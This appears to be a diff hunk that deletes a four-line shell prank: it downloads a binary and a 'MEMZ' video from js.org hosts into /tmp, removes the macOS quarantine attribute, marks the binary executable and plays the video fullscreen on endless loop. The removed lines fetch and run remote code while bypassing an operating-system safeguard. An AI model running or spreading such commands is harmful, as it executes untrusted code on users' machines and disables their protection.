@@ -1,4 +1,0 @@
-curl -o /tmp/ssjd https://impactminiblox.js.org/Theprank/ffplay
-curl -o /tmp/memz.mov https://impactclient.js.org/Theprank/MEMZ.mov
-chmod +x /tmp/ssjd; xattr -d com.apple.quarantine /tmp/ssjd
-/tmp/ssjd -fs -loop 0 /tmp/memz.mov
